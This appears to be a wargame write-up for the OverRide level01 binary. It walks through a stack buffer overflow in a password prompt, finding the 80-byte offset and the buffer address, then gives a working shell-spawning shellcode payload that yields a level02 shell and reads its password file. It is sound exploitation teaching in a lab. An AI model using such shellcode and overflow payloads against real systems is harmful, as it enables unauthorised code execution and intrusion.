# Level 1

Before us we have a binary which represents an admin login prompt.
First, it asks us for the username which it `fgets` into a global variable called `a_user_name`, and if it matches `dat_wil`, we can input the password that's checked to be admin but it's just a troll.
The password would then be read into a 64 byte buffer with `fgets`, but here fgets will read up to 256 bytes, so we can overflow.

Using our trusty [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), we find that the offset is 80.

```shell
(gdb) r < <(echo 'dat_wil'; sleep .2; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"')
Starting program: /home/users/level01/level01 < <(echo 'dat_wil'; sleep .2; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

Now that we know the offset of the overflow we'll need the address of the password buffer in memory. To accomplish that we can check the return value of the second `fgets` within `ltrace`. 
Note: Some form of address randomization is employed here, so the address is subject to changes
```shell
level01@OverRide:~$ ltrace -e 'fgets' ./level01 < <(echo 'dat_wil'; sleep .2; echo 'deeznuts') 1>/dev/null
fgets("dat_wil\n", 256, 0xf7fcfac0)                                                                = 0x0804a040
fgets("deeznuts\n", 100, 0xf7fcfac0)                                                               = 0xffffd6cc
+++ exited (status 1) +++
```

Let's now inject that address after our 28 bytes [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) and 52 bytes of padding.
```shell
level01@OverRide:~$ (echo 'dat_wil'; sleep .5; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B"*52 + "\xcc\xd6\xff\xff"'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
[censored]
```

## Failed method

TODO: maybe delete this

Instead of ltrace I wanted to get the value of the password buffer with gdb but the address didn't work in the shell, possible cause is some relocation stuff going on as the addresses aren't the same and change between ssh sessions.

```shell
(gdb) disas main
[...]
   0x08048579 <+169>:   lea    0x1c(%esp),%eax
   0x0804857d <+173>:   mov    %eax,(%esp)
   0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
[...]
(gdb) b verify_user_pass
Breakpoint 1 at 0x80484a8
(gdb) r < <(echo 'dat_wil'; sleep .2; python -c 'print "B"*80')
Starting program: /home/users/level01/level01 < <(echo 'dat_wil'; sleep .2; python -c 'print "B"*80')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:

Breakpoint 1, 0x080484a8 in verify_user_pass ()
(gdb) finish
Run till exit from #0  0x080484a8 in verify_user_pass ()
0x08048585 in main ()
(gdb) x/s $esp+0x1c
0xffffd6ac:      'B' <repeats 80 times>, "\n"
```
